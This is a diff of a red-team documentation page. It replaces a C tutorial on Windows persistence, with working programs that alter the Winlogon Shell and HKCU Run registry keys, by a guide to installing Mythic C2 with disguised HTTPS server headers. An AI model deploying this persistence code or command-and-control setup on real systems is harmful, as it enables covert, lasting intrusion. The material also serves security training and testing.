@@ -10,24 +10,24 @@
     <meta name="generator" content="Retype 3.11.0">
 
     <!-- Primary Meta Tags -->
-    <title>Malware Development with C - Establishing Persistence</title>
-    <meta name="title" content="Malware Development with C - Establishing Persistence">
-    <meta name="description" content="Welcome, fellow cybersecurity enthusiasts! Today, let's embark on a journey into malware development once again, and more specifically - establishing...">
+    <title>Setting up Mythic C2</title>
+    <meta name="title" content="Setting up Mythic C2">
+    <meta name="description" content="This documentation will go through installation and configuration part for Mythic C2.">
 
     <!-- Canonical -->
-    <link rel="canonical" href="https://lsecqt.github.io/Red-Teaming-Army/malware-development/malware-development-with-c-basic-persistence/">
+    <link rel="canonical" href="https://lsecqt.github.io/Red-Teaming-Army/infrastructure/setting-up-mythic-c2/">
 
     <!-- Open Graph / Facebook -->
     <meta property="og:type" content="website">
-    <meta property="og:url" content="https://lsecqt.github.io/Red-Teaming-Army/malware-development/malware-development-with-c-basic-persistence/">
-    <meta property="og:title" content="Malware Development with C - Establishing Persistence">
-    <meta property="og:description" content="Welcome, fellow cybersecurity enthusiasts! Today, let's embark on a journey into malware development once again, and more specifically - establishing...">
+    <meta property="og:url" content="https://lsecqt.github.io/Red-Teaming-Army/infrastructure/setting-up-mythic-c2/">
+    <meta property="og:title" content="Setting up Mythic C2">
+    <meta property="og:description" content="This documentation will go through installation and configuration part for Mythic C2.">
 
     <!-- Twitter -->
     <meta property="twitter:card" content="summary_large_image">
-    <meta property="twitter:url" content="https://lsecqt.github.io/Red-Teaming-Army/malware-development/malware-development-with-c-basic-persistence/">
-    <meta property="twitter:title" content="Malware Development with C - Establishing Persistence">
-    <meta property="twitter:description" content="Welcome, fellow cybersecurity enthusiasts! Today, let's embark on a journey into malware development once again, and more specifically - establishing...">
+    <meta property="twitter:url" content="https://lsecqt.github.io/Red-Teaming-Army/infrastructure/setting-up-mythic-c2/">
+    <meta property="twitter:title" content="Setting up Mythic C2">
+    <meta property="twitter:description" content="This documentation will go through installation and configuration part for Mythic C2.">
 
     <script data-cfasync="false">(function(){var cl=document.documentElement.classList,ls=localStorage.getItem("retype_scheme"),hd=cl.contains("dark"),hl=cl.contains("light"),wm=window.matchMedia&&window.matchMedia("(prefers-color-scheme: dark)").matches;if(ls==="dark"||(!ls&&wm&&!hd&&!hl)){cl.remove("light");cl.add("dark")}else if(ls==="light"||(!ls&&!wm&&!hd&&!hl)){cl.remove("dark");cl.add("light")}})();</script>
 
@@ -320,21 +320,20 @@
                                 <!-- Rendered if sidebar right is enabled -->
                                 <div id="retype-sidebar-right-toggle"></div>
                                 <!-- Page content  -->
-<doc-anchor-target id="malware-development-with-c---establishing-persistence" class="break-words">
+<doc-anchor-target id="setting-up-mythic-c2" class="break-words">
     <h1>
-        <doc-anchor-trigger class="header-anchor-trigger" to="#malware-development-with-c---establishing-persistence">#</doc-anchor-trigger>
-        <span>Malware Development with C - Establishing Persistence</span>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#setting-up-mythic-c2">#</doc-anchor-trigger>
+        <span>Setting up Mythic C2</span>
     </h1>
 </doc-anchor-target>
-<doc-anchor-target id="introduction">
+<doc-anchor-target id="intro">
     <h2>
-        <doc-anchor-trigger class="header-anchor-trigger" to="#introduction">#</doc-anchor-trigger>
-        <span>Introduction</span>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#intro">#</doc-anchor-trigger>
+        <span>Intro</span>
     </h2>
 </doc-anchor-target>
-<p>Welcome, fellow cybersecurity enthusiasts! Today, let&#x27;s embark on a journey into malware development once again, and more specifically - establishing persistence. As ethical hackers, our mission isn&#x27;t just about breaching defenses; it&#x27;s about understanding the defender&#x27;s playbook to strengthen our offenses.</p>
-<p>While establishing persistence is often not needed during engagements (pentesting projects), there are rare cases where it is extremely important. I am aware that there are plenty of open source tools like <a href="https://github.com/mandiant/SharPersist">SharPersist</a>, but I think that it can be valuable to craft our own little POCs. With the ability to write POCs, they can now be customly integrated into C2 frameworks, packing applications, or even custom shellcode runners.</p>
-<p>Before diving deeper into this topic, make sure to join my <a href="https://discord.gg/bgSpdheEgu">Discord</a> where we share experience, knowledge and doing CTFs together.</p>
+<p>This documentation will go through installation and configuration part for Mythic C2.</p>
+<p>Here, I will showcase how to download, install it, setup HTTP C2 profile for SSL communication and install the Apollo agent.</p>
 <div class="flex mb-6">
     <div class="shrink-0 w-1.5 rounded-tl-lg rounded-bl-lg bg-callout-primary"></div>
     <div class="flex w-full py-4 border border-l-0 rounded-tr-lg rounded-br-lg doc-callout bg-callout-base-bg border-callout-base-border" role="alert">
@@ -348,69 +347,60 @@
             </svg>
         </div>
         <div class="pr-5 ml-3 w-full">
-<p>If you have further appreciation for my work, don&#x27;t hesitate to become my <a href="https://www.patreon.com/Lsecqt">Patreon</a>! This way, you help the Red Teaming Army grow, while getting access to private tools such as the ShadowBurn packer.</p>
+<p>Important:
+Special thanks to all of my Patreon supporters.
+By supporting my work on <a href="https://www.patreon.com/Lsecqt">Patreon</a> you get access to internal documentation, private tools and videos.</p>
         </div>
     </div>
 </div>
-<doc-anchor-target id="understanding-persistence">
+<p>You will need:</p>
+<div class="table-wrapper scrollbar overflow-hidden">
+<table class="comfortable">
+<thead>
+<tr>
+<th>Item</th>
+<th>Link</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Mythic C2 Core</td>
+<td><a href="https://github.com/its-a-feature/Mythic">https://github.com/its-a-feature/Mythic</a></td>
+</tr>
+<tr>
+<td>HTTP C2 Profile</td>
+<td><a href="https://github.com/MythicC2Profiles/http">https://github.com/MythicC2Profiles/http</a></td>
+</tr>
+<tr>
+<td>Apollo Agent</td>
+<td><a href="https://github.com/MythicAgents/Apollo">https://github.com/MythicAgents/Apollo</a></td>
+</tr>
+</tbody>
+</table>
+</div>
+<doc-anchor-target id="installation">
     <h2>
-        <doc-anchor-trigger class="header-anchor-trigger" to="#understanding-persistence">#</doc-anchor-trigger>
-        <span>Understanding Persistence</span>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#installation">#</doc-anchor-trigger>
+        <span>Installation</span>
     </h2>
 </doc-anchor-target>
-<p>Picture this: you&#x27;ve successfully breached a target system - kudos! But what&#x27;s next? That&#x27;s where persistence comes into play. It&#x27;s the art of maintaining access covertly, like leaving a hidden key under the doormat for future entry. There are 2 main important aspects of establishing persistence:</p>
+<doc-anchor-target id="installing-mythic-c2-core">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#installing-mythic-c2-core">#</doc-anchor-trigger>
+        <span>Installing Mythic C2 Core</span>
+    </h3>
+</doc-anchor-target>
+<p>Before going straight to the installation, we need to make sure we have the prerequisites. Mythic is heavily dockerised system, which simply mean that everything runs inside a docker container. In order to make it work you will need to have:</p>
 <ul>
-<li>Evasiveness</li>
-<li>Speed</li>
+<li>docker</li>
+<li>docker-compose plugin</li>
+<li>gcc</li>
+<li>make</li>
 </ul>
-<p>In order to establish persistence, the payload must be present on the compromised system. This can vary from anything like storing .exe file on hidden local / share path, up to replacing a legitimately looking .dll file with a one with malicious payload inside (DLL Hijacking). This is done because on reboot, all cached memory is deleted, which means that in order to establish proper persistence, the malicious payload should by itself be persistent on the targeted machine. Usually, the targeted endpoints are protected with some form of endpoint protection, which generally mean AV or EDR. I personally have never seen workstation or server without endpoint protection in real engagement. In order to establish persistence, the payload should be enough evasive by itself, otherwise you can imagine what goes next.</p>
-<p>It also depends in what context you received your initial access. There are multiple cases in which this might happen, but one of the most known one is via phishing. If this is the case, the speed is extremely important. There are situations where your initial payload is working, but as soon as you touch that C2 console, the runtime detection kills your beacon, especially, if you directly start running risky commands like execute-assembly. In order to not be in that case, it is crucial to establish persistence as soon as your beacons open up! If the initial breach was done from service level exploitation for example, then you would have definitely more time, and also, the service level attacks are by themselves a kind of persistence. If the beacon dies, you can technically exploit the service again. Of course that this will raise more attention than needed, but you got the idea!</p>
-<p>I know that there are endless ways of establishing persistence, I cannot say which one of them is the best because there is no &quot;best&quot; method, since the evasiveness may vary between different environments. But let&#x27;s think about it in a different way - Is it possible to establish persistence right off the bat, with the initial payload itself? Well, YES!</p>
-<doc-anchor-target id="some-windows-internals-and-theory">
-    <h2>
-        <doc-anchor-trigger class="header-anchor-trigger" to="#some-windows-internals-and-theory">#</doc-anchor-trigger>
-        <span>Some windows internals and theory</span>
-    </h2>
-</doc-anchor-target>
-<doc-anchor-target id="general-persistence-workflow">
-    <h3>
-        <doc-anchor-trigger class="header-anchor-trigger" to="#general-persistence-workflow">#</doc-anchor-trigger>
-        <span>General persistence workflow</span>
-    </h3>
-</doc-anchor-target>
-<p>Establishing persistence isn&#x27;t about wreaking havoc; mainly because the havoc itself will help the blue teamers find and kill your persistence payloads. Generally, establishing persistence is about making evasive payload that will trigger new C2 beacon when executed -&gt; then store it somewhere to be as hidden as possible and -&gt; then force the Windows OS to execute it each time some action is performed.</p>
-<p>This action might be rebooting the machine, login from specific user account, starting the screensaver, forcing the sticky keys prompt out or even time based persistence via the <a href="https://learn.microsoft.com/en-us/windows/win32/taskschd/task-scheduler-start-page">task scheduler</a>. There are endless more ways of forcing Windows OS to execute something simultaneous with something else, and this is usually done via the <a href="https://learn.microsoft.com/en-us/troubleshoot/windows-server/performance/windows-registry-advanced-users">registry keys</a>.</p>
-<doc-anchor-target id="windows-registries">
-    <h3>
-        <doc-anchor-trigger class="header-anchor-trigger" to="#windows-registries">#</doc-anchor-trigger>
-        <span>Windows registries?</span>
-    </h3>
-</doc-anchor-target>
-<p>At its core, the Windows registry is a centralized database that stores configuration settings and options for the operating system and installed applications. Think of it as a digital library where Windows stores crucial information about hardware, software, user preferences, and system settings. Within this repository, registry keys play a pivotal role - they serve as containers that organize and categorize various settings and values.</p>
-<p>Registry keys follow a hierarchical structure, like folders within folders in a file system. At the top level, we have five main branches, known as &quot;hives,&quot; each responsible for specific aspects of system configuration:</p>
-<ol>
-<li><code v-pre>HKEY_CLASSES_ROOT</code> (<code v-pre>HKCR</code>): Contains file type associations and OLE object class information.</li>
-<li><code v-pre>HKEY_CURRENT_USER</code> (<code v-pre>HKCU</code>): Stores settings specific to the currently logged-in user.</li>
-<li><code v-pre>HKEY_LOCAL_MACHINE</code> (<code v-pre>HKLM</code>): Holds system-wide settings applicable to all users on the machine.</li>
-<li><code v-pre>HKEY_USERS</code> (<code v-pre>HKU</code>): Stores profiles for all user accounts on the system.</li>
-<li><code v-pre>HKEY_CURRENT_CONFIG</code> (<code v-pre>HKCC</code>): Provides a pointer to the current hardware profile being used by the system.</li>
-</ol>
-<p>Within each hive, we find a plethora of subkeys, each housing a unique set of configuration settings. These keys may contain values such as strings, integers, binary data, or even references to other resources.</p>
-<p>Registry keys play a crucial role in configuring and customizing the Windows operating system. From system startup and device driver settings to user preferences and application configurations, almost every aspect of Windows is governed by registry keys. Modifying these keys allows users, administrators, and applications to tailor the system to their specific needs, or it can simply allow us to establish persistence.</p>
-<doc-anchor-target id="establishing-persistence-automatically-with-c">
-    <h2>
-        <doc-anchor-trigger class="header-anchor-trigger" to="#establishing-persistence-automatically-with-c">#</doc-anchor-trigger>
-        <span>Establishing Persistence Automatically with C</span>
-    </h2>
-</doc-anchor-target>
-<doc-anchor-target id="admin-level-persistence">
-    <h3>
-        <doc-anchor-trigger class="header-anchor-trigger" to="#admin-level-persistence">#</doc-anchor-trigger>
-        <span>Admin Level Persistence</span>
-    </h3>
-</doc-anchor-target>
-<p>As already mentioned, a lot of Windows configurations are stored inside the registry database. But now here comes the question: <code v-pre>Which key I need to add or modify?</code> The answer to this question is not trivial as it depends on what persistence method you want to implement.</p>
-<p>In this blog, I want to showcase how to establish persistence via <code v-pre>winlogon</code>. This means that the only thing that can trigger the payload, is when someone is logging in to the compromised system.</p>
+<p>The following one liner should be enough:</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre translate="no" class="language-bash"><code v-pre class="language-bash">sudo apt update &amp;&amp; sudo apt install -y docker.io docker-compose-plugin gcc make</code></pre>
+</doc-codeblock></div>
 <div class="flex mb-6">
     <div class="shrink-0 w-1.5 rounded-tl-lg rounded-bl-lg bg-callout-primary"></div>
     <div class="flex w-full py-4 border border-l-0 rounded-tr-lg rounded-br-lg doc-callout bg-callout-base-bg border-callout-base-border" role="alert">
@@ -424,16 +414,32 @@
             </svg>
         </div>
         <div class="pr-5 ml-3 w-full">
-<p>I did not test this technique over <code v-pre>RDP</code> protocol, make sure to test it and give me your feedback!</p>
+<p>Inside the Mythic&#x27;s repo there are files for automating this approach for different distros like <a href="https://github.com/its-a-feature/Mythic/blob/master/install_docker_kali.sh">kali</a>, always run this first especially on a brand new system!</p>
         </div>
     </div>
 </div>
-<p>To achieve this logon persistence, we will need administrative local access first. There is a registry key called <code v-pre>Shell</code>, which is located at <code v-pre>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\</code>. By default, its value is <code v-pre>explorer.exe</code></p>
+<p>Now we are ready to install Mythic C2:</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre translate="no" class="language-bash"><code v-pre class="language-bash">cd /opt/
+git clone https://github.com/its-a-feature/Mythic
+cd Mythic
+sudo make</code></pre>
+</doc-codeblock></div>
+<p>If everything is alright up to this point, a <code v-pre>mythic-cli</code> binary will be generated inside your folder. This binary controls everything.</p>
 <p><figure class="content-center">
-    <img src="default_shell.png" alt="Default value of HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Shell" class="rounded-image-rounded border-image-border border-image-border-width" />
-    <figcaption class="caption">Default value of HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Shell</figcaption>
+    <img src="../../attachments/pasted-image-20250723202604.png" alt="" class="rounded-image-rounded border-image-border border-image-border-width" />
+    <figcaption class="caption"></figcaption>
 </figure>
 </p>
+<p>Then we need to install a C2 profile and an Agent.</p>
+<p>In a nutshell, the Agent is the payload itself that will start a callback when executed on the targeted system, whereas the C2 profile is the nature of the callback, for example SMB / HTTP and e.t.c.</p>
+<doc-anchor-target id="installing-http-profile">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#installing-http-profile">#</doc-anchor-trigger>
+        <span>Installing HTTP Profile</span>
+    </h3>
+</doc-anchor-target>
+<p>Open sources C2 profiles can be found here: <a href="https://github.com/MythicC2Profiles">https://github.com/MythicC2Profiles</a></p>
 <div class="flex mb-6">
     <div class="shrink-0 w-1.5 rounded-tl-lg rounded-bl-lg bg-callout-primary"></div>
     <div class="flex w-full py-4 border border-l-0 rounded-tr-lg rounded-br-lg doc-callout bg-callout-base-bg border-callout-base-border" role="alert">
@@ -447,112 +453,101 @@
             </svg>
         </div>
         <div class="pr-5 ml-3 w-full">
-<p>Most of the registry keys inside <code v-pre>HKEY_LOCAL_MACHINE</code> requires administrative privileges to get modified.</p>
+<p>Installation instructions for other C2 profiles are the same, however their configuration might differ</p>
         </div>
     </div>
 </div>
-<p>The default value makes complete sense. When the user logs in, we want <code v-pre>explorer.exe</code> to start, so that the user can now operate with Windows OS via the GUI. If we have the needed access rights, we can simply modify this key, so that on the next user signin, the specified payload will be executed. Just for demonstration purposes, let&#x27;s use <code v-pre>powershell.exe</code> as a payload. While it sounds quick and simple, there is one caveat to this technique. We cannot replace or remove <code v-pre>explorer.exe</code> as it will break the logon process afterwards.</p>
-<p>In order to execute a custom payload alongside with <code v-pre>explorer.exe</code>, we can simply append comma and then the custom payload. So the final value would look something like: <code v-pre>explorer.exe,powershell.exe</code>.</p>
-<p>Enough theory! The following Win32 APIs can help us to do this programmatically:</p>
-<p><a href="https://learn.microsoft.com/en-us/windows/win32/api/winreg/nf-winreg-regopenkeyexa">RegOpenKeyExA</a></p>
+<p>To install the HTTP profile you can follow these steps, which are also explained in its <a href="https://github.com/MythicC2Profiles/http">repo</a>:</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre translate="no" class="language-c"><code v-pre class="language-c">LSTATUS RegOpenKeyExA(
-  [in]           HKEY   hKey,
-  [in, optional] LPCSTR lpSubKey,
-  [in]           DWORD  ulOptions,
-  [in]           REGSAM samDesired,
-  [out]          PHKEY  phkResult
-);</code></pre>
+<pre translate="no" class="language-bash"><code v-pre class="language-bash">cd /opt/Mythic
+sudo ./mythic-cli install github https://github.com/MythicC2Profiles/http</code></pre>
 </doc-codeblock></div>
-<p>and <a href="https://learn.microsoft.com/en-us/windows/win32/api/winreg/nf-winreg-regsetvalueexa">RegSetValueExA</a></p>
+<p><figure class="content-center">
+    <img src="../../attachments/pasted-image-20250723203212.png" alt="" class="rounded-image-rounded border-image-border border-image-border-width" />
+    <figcaption class="caption"></figcaption>
+</figure>
+</p>
+<doc-anchor-target id="installing-the-apollo-agent">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#installing-the-apollo-agent">#</doc-anchor-trigger>
+        <span>Installing The Apollo Agent</span>
+    </h3>
+</doc-anchor-target>
+<p>Open sources Agents can be found here: <a href="https://github.com/mythicagents">https://github.com/mythicagents</a></p>
+<div class="flex mb-6">
+    <div class="shrink-0 w-1.5 rounded-tl-lg rounded-bl-lg bg-callout-primary"></div>
+    <div class="flex w-full py-4 border border-l-0 rounded-tr-lg rounded-br-lg doc-callout bg-callout-base-bg border-callout-base-border" role="alert">
+        <div class="flex items-center ml-4 h-7">
+            <svg xmlns="http://www.w3.org/2000/svg" class="mb-px text-callout-primary" width="22" height="22" viewBox="0 0 24 24" role="presentation">
+                <g fill="currentColor"><g>
+                    <path d="M12 1C5.93 1 1 5.93 1 12s4.93 11 11 11 11-4.93 11-11S18.07 1 12 1zm0 20c-4.96 0-9-4.04-9-9s4.04-9 9-9 9 4.04 9 9-4.04 9-9 9z"></path>
+                    <path d="M12 11c-.55 0-1 .45-1 1v4c0 .55.45 1 1 1s1-.45 1-1v-4c0-.55-.45-1-1-1zM12.01 7c-.56 0-1 .45-1 1s.45 1 1 1 1-.45 1-1-.45-1-1-1z"></path>
+                    <path fill="none" d="M0 0h24v24H0z"></path>
+                </g></g>
+            </svg>
+        </div>
+        <div class="pr-5 ml-3 w-full">
+<p>Installation instructions for other Agents are the same</p>
+        </div>
+    </div>
+</div>
+<p>To install the Apollo agent you can follow these steps, which are also explained in its <a href="https://github.com/MythicAgents/Apollo">repo</a></p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre translate="no" class="language-c"><code v-pre class="language-c">LSTATUS RegSetValueExA(
-  [in]           HKEY       hKey,
-  [in, optional] LPCSTR     lpValueName,
-                 DWORD      Reserved,
-  [in]           DWORD      dwType,
-  [in]           const BYTE *lpData,
-  [in]           DWORD      cbData
-);</code></pre>
+<pre translate="no" class="language-bash"><code v-pre class="language-bash">cd /opt/Mythic
+sudo ./mythic-cli install github https://github.com/MythicAgents/Apollo.git</code></pre>
 </doc-codeblock></div>
-<p>These functions allow us to open a registry hive, and modify its values if, of course, we have the appropriate privileges over the system.</p>
-<p>I came up with the following POC code, which is already added into the <a href="https://github.com/lsecqt/OffensiveCpp/blob/main/Techniques/Persistence/admin_persistence_winlogon.c">OffensiveCpp</a> project.</p>
+<p><figure class="content-center">
+    <img src="../../attachments/pasted-image-20250723203442.png" alt="" class="rounded-image-rounded border-image-border border-image-border-width" />
+    <figcaption class="caption"></figcaption>
+</figure>
+</p>
+<doc-anchor-target id="configuring-mythic-c2">
+    <h2>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#configuring-mythic-c2">#</doc-anchor-trigger>
+        <span>Configuring Mythic C2</span>
+    </h2>
+</doc-anchor-target>
+<p>Here I want to setup the HTTP C2 profile to accept only encrypted communication. For the demonstration purposes I will go with self signed certificate, but ideally, you would want to create a valid certificate.</p>
+<p>To generate self signed certificate you can use this snippet:</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre translate="no" class="language-c"><code v-pre class="language-c">#include &lt;windows.h&gt;
-#include &lt;stdio.h&gt;
-
-// This POC executes powershell.exe on system logon
-// It requires administrative privileges
-// https://youtu.be/VqDY2Tfz6Qw?t=20
-
-int main() {
-    HKEY hKey;
-    LPCSTR subKey = &quot;SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon&quot;;
-    LPCSTR valueName = &quot;Shell&quot;;
-    LPCSTR newValue = &quot;explorer.exe,powershell.exe&quot;;
-
-    LONG openResult = RegOpenKeyExA(HKEY_LOCAL_MACHINE, subKey, 0, KEY_SET_VALUE, &amp;hKey);
-    if (openResult != ERROR_SUCCESS) {
-        printf(&quot;Error opening registry key. Error code: %d\n&quot;, openResult);
-        return 1;
+<pre translate="no" class="language-bash"><code v-pre class="language-bash">openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -sha256 -days 365</code></pre>
+</doc-codeblock></div>
+<p>This will output 2 file:</p>
+<ul>
+<li>cert.pem</li>
+<li>key.pem</li>
+</ul>
+<p>Place them in <code v-pre>/opt/Mythic/C2_Profiles/http/c2_code/</code></p>
+<p>Then, open <code v-pre>/opt/Mythic/C2_Profiles/http/c2_code/config.json</code> with any text editor (root needed by default)</p>
+<p>And here, make sure to have something like this:</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre translate="no" class="language-json"><code v-pre class="language-json">{
+  &quot;instances&quot;: [
+  {
+    &quot;ServerHeaders&quot;: {
+      &quot;Server&quot;: &quot;NetDNA-cache/2.2&quot;,
+      &quot;Cache-Control&quot;: &quot;max-age=0, no-cache&quot;,
+      &quot;Pragma&quot;: &quot;no-cache&quot;,
+      &quot;Connection&quot;: &quot;keep-alive&quot;,
+      &quot;Content-Type&quot;: &quot;application/javascript; charset=utf-8&quot;
+    },
+    &quot;port&quot;: 443,
+    &quot;key_path&quot;: &quot;key.pem&quot;,
+    &quot;cert_path&quot;: &quot;cert.pem&quot;,
+    &quot;debug&quot;: false,
+    &quot;use_ssl&quot;: true,
+    &quot;payloads&quot;: {}
     }
-
-    LONG setResult = RegSetValueExA(hKey, valueName, 0, REG_SZ, (BYTE*)newValue, strlen(newValue) + 1);
-    if (setResult != ERROR_SUCCESS) {
-        printf(&quot;Error setting registry value. Error code: %d\n&quot;, setResult);
-        RegCloseKey(hKey);
-        return 1;
-    }
-
-    printf(&quot;Registry value changed successfully.\n&quot;);
-
-    RegCloseKey(hKey);
-    return 0;
+  ]
 }</code></pre>
 </doc-codeblock></div>
-<p>After executing the compiled code, we can now observe that the registry key is modified.</p>
-<p><figure class="content-center">
-    <img src="modified_shell.png" alt="Shell key now contains powershell.exe payload" class="rounded-image-rounded border-image-border border-image-border-width" />
-    <figcaption class="caption">Shell key now contains powershell.exe payload</figcaption>
-</figure>
-</p>
-<p>After a simple reboot (or signout / signin) the payload is triggered.</p>
-<p><figure class="content-center">
-    <img src="powershell.png" alt="Powershell.exe executed after login" class="rounded-image-rounded border-image-border border-image-border-width" />
-    <figcaption class="caption">Powershell.exe executed after login</figcaption>
-</figure>
-</p>
-<div class="flex mb-6">
-    <div class="shrink-0 w-1.5 rounded-tl-lg rounded-bl-lg bg-callout-primary"></div>
-    <div class="flex w-full py-4 border border-l-0 rounded-tr-lg rounded-br-lg doc-callout bg-callout-base-bg border-callout-base-border" role="alert">
-        <div class="flex items-center ml-4 h-7">
-            <svg xmlns="http://www.w3.org/2000/svg" class="mb-px text-callout-primary" width="22" height="22" viewBox="0 0 24 24" role="presentation">
-                <g fill="currentColor"><g>
-                    <path d="M12 1C5.93 1 1 5.93 1 12s4.93 11 11 11 11-4.93 11-11S18.07 1 12 1zm0 20c-4.96 0-9-4.04-9-9s4.04-9 9-9 9 4.04 9 9-4.04 9-9 9z"></path>
-                    <path d="M12 11c-.55 0-1 .45-1 1v4c0 .55.45 1 1 1s1-.45 1-1v-4c0-.55-.45-1-1-1zM12.01 7c-.56 0-1 .45-1 1s.45 1 1 1 1-.45 1-1-.45-1-1-1z"></path>
-                    <path fill="none" d="M0 0h24v24H0z"></path>
-                </g></g>
-            </svg>
-        </div>
-        <div class="pr-5 ml-3 w-full">
-<p>The payload is executed in Medium integrity level and from the context of the logged in user. It will execute for any user that logs in to the system.</p>
-        </div>
-    </div>
-</div>
-<p>While this technique is effective, a very important question may arise:</p>
+<p>Pay attention to:</p>
 <ul>
-<li>This is cool but how often I might get admin shell directly? Is it possible to establish persistence in userland?</li>
+<li>port</li>
+<li>key_path</li>
+<li>cert_path</li>
+<li>use_ssl</li>
 </ul>
-<p>Well, getting admin access directly is rare, so let&#x27;s setup some userland persistence now.</p>
-<doc-anchor-target id="user-level-persistence">
-    <h3>
-        <doc-anchor-trigger class="header-anchor-trigger" to="#user-level-persistence">#</doc-anchor-trigger>
-        <span>User Level Persistence</span>
-    </h3>
-</doc-anchor-target>
-<p>Implementing the same technique in userland is impossible, because we cannot modify registry keys inside <code v-pre>HKEY_LOCAL_MACHINE</code>, however, we can establish persistence using the <code v-pre>HKEY_CURRENT_USER</code> hive, since the current user can actively influence the settings there. <code v-pre>HKEY_CURRENT_USER</code> (<code v-pre>HKCU</code>) is a registry hive in the Windows Registry that stores configuration settings and preferences specific to the currently logged-in user. Unlike <code v-pre>HKEY_LOCAL_MACHINE</code>, which contains system-wide settings, <code v-pre>HKCU</code> stores settings that are unique to each user profile. This registry hive is mainly used for user preferences, application settings, desktop customization and more.</p>
-<p>Moving on to the persistence landscape, following the same logic as the previous example, there is this registry path: <code v-pre>HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run</code>.</p>
-<p>This path may contain multiple keys. The interesting part is that no matter what is added, if it is a valid path to binary, it will get executed.</p>
 <div class="flex mb-6">
     <div class="shrink-0 w-1.5 rounded-tl-lg rounded-bl-lg bg-callout-primary"></div>
     <div class="flex w-full py-4 border border-l-0 rounded-tr-lg rounded-br-lg doc-callout bg-callout-base-bg border-callout-base-border" role="alert">
@@ -566,63 +561,25 @@ int main() {
             </svg>
         </div>
         <div class="pr-5 ml-3 w-full">
-<p>The registry key name does not matter in this scenario.</p>
+<p>Also, you would want to also change some of the default values, like the one for the <code v-pre>Server</code> header. Trust me.</p>
         </div>
     </div>
 </div>
-<p>Since in this demo we want to add and not modify a key, the <a href="https://learn.microsoft.com/en-us/windows/win32/api/winreg/nf-winreg-regcreatekeyexa">RegCreateKeyExA</a> Win32 API needs to be introduced:</p>
-<div class="codeblock-wrapper"><doc-codeblock>
-<pre translate="no" class="language-c"><code v-pre class="language-c">LSTATUS RegCreateKeyExA(
-  [in]            HKEY                        hKey,
-  [in]            LPCSTR                      lpSubKey,
-                  DWORD                       Reserved,
-  [in, optional]  LPSTR                       lpClass,
-  [in]            DWORD                       dwOptions,
-  [in]            REGSAM                      samDesired,
-  [in, optional]  const LPSECURITY_ATTRIBUTES lpSecurityAttributes,
-  [out]           PHKEY                       phkResult,
-  [out, optional] LPDWORD                     lpdwDisposition
-);</code></pre>
-</doc-codeblock></div>
-<p>This API, as the name suggest, allows us to create a registry key inside the specified path. Using the docs, I came up with the following POC to add remote key:</p>
-<div class="codeblock-wrapper"><doc-codeblock>
-<pre translate="no" class="language-c"><code v-pre class="language-c">#include &lt;windows.h&gt;
-#include &lt;stdio.h&gt;
-
-// This POC executes powershell.exe when the specific user logs in again
-// It does not require administrative privileges
-// https://youtu.be/VqDY2Tfz6Qw?t=225
-
-
-int main() {
-    HKEY hKey;
-    LPCSTR subKey = &quot;SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run&quot;;
-    LPCSTR valueName = &quot;test&quot;;
-    LPCSTR valueData = &quot;powershell.exe&quot;;
-
-    LONG openResult = RegCreateKeyExA(HKEY_CURRENT_USER, subKey, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_SET_VALUE, NULL, &amp;hKey, NULL);
-    if (openResult != ERROR_SUCCESS) {
-        printf(&quot;Error creating/opening registry key. Error code: %d\n&quot;, openResult);
-        return 1;
-    }
-
-    LONG setResult = RegSetValueExA(hKey, valueName, 0, REG_SZ, (BYTE*)valueData, strlen(valueData) + 1);
-    if (setResult != ERROR_SUCCESS) {
-        printf(&quot;Error setting registry value. Error code: %d\n&quot;, setResult);
-        RegCloseKey(hKey);
-        return 1;
-    }
-
-    printf(&quot;Registry key added successfully.\n&quot;);
-
-    RegCloseKey(hKey);
-    return 0;
-}</code></pre>
-</doc-codeblock></div>
-<p>In that case the key name is called <code v-pre>test</code>, and once again, we are executing <code v-pre>powershell.exe</code>.</p>
+<p>Now you can start your whole Mythic C2, which will also fire up the HTTP C2 profile and the Apollo agent.</p>
 <p><figure class="content-center">
-    <img src="modified_run.png" alt="Registry key added" class="rounded-image-rounded border-image-border border-image-border-width" />
-    <figcaption class="caption">Registry key added</figcaption>
+    <img src="../../attachments/pasted-image-20250723204102.png" alt="" class="rounded-image-rounded border-image-border border-image-border-width" />
+    <figcaption class="caption"></figcaption>
+</figure>
+</p>
+<p>If everything is alright, you should see both dockers running, and also their status should be online from the Mythic UI</p>
+<p><figure class="content-center">
+    <img src="../../attachments/pasted-image-20250723204441.png" alt="" class="rounded-image-rounded border-image-border border-image-border-width" />
+    <figcaption class="caption"></figcaption>
+</figure>
+</p>
+<p><figure class="content-center">
+    <img src="../../attachments/pasted-image-20250723204452.png" alt="" class="rounded-image-rounded border-image-border border-image-border-width" />
+    <figcaption class="caption"></figcaption>
 </figure>
 </p>
 <div class="flex mb-6">
@@ -638,43 +595,47 @@ int main() {
             </svg>
         </div>
         <div class="pr-5 ml-3 w-full">
-<p>This persistence method works only for the scope of the current user.</p>
+<p>Important:
+Now whenever you generate a payload, always make sure to use https prefix and the port you specified in your config file.</p>
         </div>
     </div>
 </div>
-<p>After reboot (or signin) we can confirm that the payload is successfully executed.</p>
 <p><figure class="content-center">
-    <img src="powershell2.png" alt="powershell.exe with flushed settings is spawned." class="rounded-image-rounded border-image-border border-image-border-width" />
